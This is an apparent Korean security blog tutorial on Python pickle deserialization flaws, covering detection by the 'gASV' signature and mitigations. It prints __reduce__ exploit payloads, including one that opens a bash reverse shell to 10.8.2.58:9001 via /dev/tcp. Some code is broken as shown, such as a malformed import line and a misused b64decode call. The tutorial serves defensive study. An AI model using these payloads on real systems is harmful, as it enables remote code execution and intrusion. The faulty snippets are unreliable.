---
layout: single
title: Deserialize_Vulnability for Python_Pickle
categories: Web-vuln
tag: [python, Pickle, Deserialize, Deserialize Vulnability]
toc: true
author_profile: false
---

# Deserialize란?

> 역 직렬화로 써 직렬화된 데이터 즉 바이트 스트림을 역연산 하는 과정을 말한다.

## Serialization?

> 계층 구조의 데이터를 바이트 스트림으로 변환하는 작업을 뜻하며,  객체를 저장 및 전송의 편리함 및 다른 플렛폼에서 사용하거나, 객체의 상태를 저장하기 위해 자주 사용된다.

# 직렬화는 어떤 기능을 하는 앤드포인트에서 사용될까?
1. 서버와 클라이언트 간의 데이터 전송
- 서버에서 객체를 JSON형식으로 직렬화하여 클라이언트에게 보내고 클라이언트는 해당 JSON을 파싱하여 객체로 변환하며, 보통 REST API, GraphQL 등 다양한 웹 API 통신에서 사용된다.
2. 데이터베이스 저장 및 조회
- ORM 사용시, 객체를 데이터베이스 레코드로 직렬화되고, 역직렬화가 이루어진다.
3. 캐싱
- 서버 측에서 데이터를 캐싱할 때 객체를 직렬화하여 캐시 스토리지에 저장하고, 캐시에서 데이터를 가져올 때 역직렬화 하여 객체로 변환하게됨
4. 파일 저장 및 읽기
- JSON, XML, YAML형식의 설정 파일을 읽고 쓸 때 객체의 직렬화, 역직렬화가 이루어진다.

# Deserialize에서의 취약점은 왜 발생 하는가?
> 사용자가 악의적인 데이터를 공격 서버와 동일한 방식으로 직렬화 하여 바이트 스트림을 생성후 서버에 제출하게 되면, 서버측에서는 이를 역직렬화 과정에서 제대로 검증하지 않고, 트리거 되기 떄문이다. 이 때 운영체제 명령어를 삽입하여 RCE 까지 연계될 수 있다.

# Deserialize for pickle
> Python에서 많이 사용되는 직렬화 및 역직렬화 라이브러리, 모듈인 Pickle 에서 Deserialize과정에서 취약점이 발생한다.
Pickle 라이브러리에서 직렬화 및 역직렬화를 하기 위해 내장된 함수는
1. pickle.dumps
2. pickle.dump
3. pickle.loads
4. picklid.load

위와 같이 존재한다. 직렬화를 하게되면, 아래와 같은 바이트 스트림으로 생성되는것을
확인할 수 있다.

```python
import pickle,base64

def pickled():
    data={"data":"test", "date":"2023"}
    serialized = pickle.dumps(data)
    print(serialized)

if __name__ == "__main__":
    pickled()

------------
b'\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04data\x94\x8c\x04test\x94\x8c\x04date\x94\x8c\x042023\x94u.'
```

하지만 일반적으로 data는 일부 문자가 인쇄 가능한 형식이 아니므로 base64로 인코딩 형식으로
변환하여 저장한다. 그 후 역직렬화를 통해 기존 데이터를 불러올 수도 있다.

```python
import pickle
import base64

def pickled():
    data={"data":"test", "date":"2023"}
    serialized = base64.b64encode(pickle.dumps(data))
    print(serialized)
    deserialized=pickle.loads(base64.b64decode(serialized))
    print(deserialized)

if __name__ == "__main__":
    pickled()
---------------------------------------------------------
b'gASVIQAAAAAAAAB9lCiMBGRhdGGUjAR0ZXN0lIwEZGF0ZZSMBDIwMjOUdS4='
{'data': 'test', 'date': '2023'}
```

# Vulnability for Pickle?
파이썬의 공식 문서의 pickle문서를 보면 아래와 같은 내용을 표시하고있다.<br>
<div class="notice">
  <h4><aside>
💡 **Warning** 
The `pickle` module **is not secure**. Only unpickle data you trust.

**Warning**

The `pickle` module **is not secure**. Only unpickle data you trust.

It is possible to construct malicious pickle data which will **execute arbitrary code during unpickling**. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

Consider signing data with [`hmac`](https://docs.python.org/3/library/hmac.html#module-hmac) if you need to ensure that it has not been tampered with.

Safer serialization formats such as [`json`](https://docs.python.org/3/library/json.html#module-json) may be more appropriate if you are processing untrusted data. See [Comparison with json](https://docs.python.org/3/library/pickle.html#comparison-with-json).

</aside></h4>
</div>
> 경고 : Pickle 모듈이 안전하지 않습니다. 신뢰할 수 있는 데이터만 unpickle 하세요
> 역직렬화 중에 임의의 코드를 실행하는 악의적인 pickle데이터를 구성하는 것이 가능합니다. 신뢰할 수 없는 소스에서 왔거나, 변조되었을 수 있는 데이터를 절대로 unpickling 하지 마세요
그렇다. 즉 악의적인 사용자가 변조된 data를 직렬화 하여 서버로 보내면, 서버는 아무 검증 없이<br>
역직렬화 과정을 진행하는데 이 때 data에 임의의 시스템 명령어가 포함하고 있을경우 이를 실행시키고 실행 결과값을 반환한다.

# 공격 표면
요청 값에 대한 응답값을 확인해보면 직렬화 기능을 사용하는지에 대해 추측이 가능하다.
<br>
Python의 직렬화된 객체의 signature 는 gASV이다. Pickle를 통해 dumps 값을 유심히 봤다면 알 수 있듯 gASV로 시작한다. 이는 인코딩된 페이로드를 식별할 수 있는 방법이 될 수 있다.
<br>
16진수라면 c28004c29526000000000000이다.

## “__reduce__”
해당 “__reduce__” 메서드를 사용하여 공격자는 공격 코드를 제작한다.
해당 <u style="color=red; ">**메서드는 인수를 사용하지 않고, 문자열이나 가급적 튜플을 반환해야한다.**</u>
“__reduce__”메서드는 직렬화 된 계층 구조를 unpickling 할 때 객체를 재구성하는 것에 대해 tuple을 반환한다.

```python
import pickle, base64
from typing import Any

class exploit:
    def __reduce__(self):
        cmd = "ping -c 1 172.20.120.196"
        return (eval, (cmd,))
test={"name":exploit()}

if __name__ == '__main__':
    print(base64.b64encode(pickle.dumps(test)).decode('utf8'))
```

위 코드와 같이 eval,builtins.{함수}, exec, popen, os.system, subprosess.{함수} 와 같이 시스템
<br>
명령어를 포함하여 직렬화를 수행할 수 있다.

## Reverse Shell

ping 로 시스템 명령이 가능하며, 외부 서버와의 연결이 허용될 때
<br>
RCE로 이어질 수 있다.

```python
import base64. os, pickle


class exploit(object):
	def __reduce__(self):
		return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.8.2.58/9001 0>&1'",))

def send_payload():
	payload = exploit()
	payload = base64.b64encode(pickle.dumps(payload)).b64decode('utf8')
	print(payload)

if __name__ == "__main__":
	send_payload()
```

# 대응방안
1. 사용자 입력값에 대한 데이터 유효성 검사 및 검증 
2. 화이트 리스트 기반의 입력값 검증 정책 적용
3. 권한이 낮은 환경에서 역직렬화된 코드를 격리 후 실행
4. pickle data가 저장되는 경우 파일 시스템 권한을 검토 후 데이터에 대한 액세스 보호 확인
5. pickle 과정에서 암호화 서명 사용

# Referance
- https://macrosec.tech/index.php/2021/06/29/exploiting-insecuredeserialization-bugs-found-in-the-wild-python-pickles/
- https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/